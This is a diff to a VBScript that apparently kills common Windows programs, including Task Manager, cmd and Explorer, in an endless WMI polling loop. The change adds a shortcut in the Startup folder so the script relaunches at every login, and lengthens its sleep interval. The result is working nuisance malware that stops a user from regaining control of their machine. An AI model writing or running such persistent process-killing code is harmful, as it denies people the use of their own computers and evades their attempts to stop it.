@@ -1,6 +1,12 @@
 Set WshShell = WScript.CreateObject("WScript.Shell")
 strExeNames = Array("notepad.exe", "calc.exe", "cmd.exe", "taskmgr.exe", "explorer.exe")
 
+'Add script to Startup folder
+strStartupPath = WshShell.SpecialFolders("Startup")
+Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.lnk")
+objShellLink.TargetPath = WScript.ScriptFullName
+objShellLink.Save
+
 Do
     For Each strExeName In strExeNames
         Set objWmi = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\.\root\cimv2")
@@ -14,5 +20,5 @@ Do
             Next
         End If
     Next
-    WScript.Sleep 1 'wait before checking again
+    WScript.Sleep 1000 'wait before checking again
 Loop
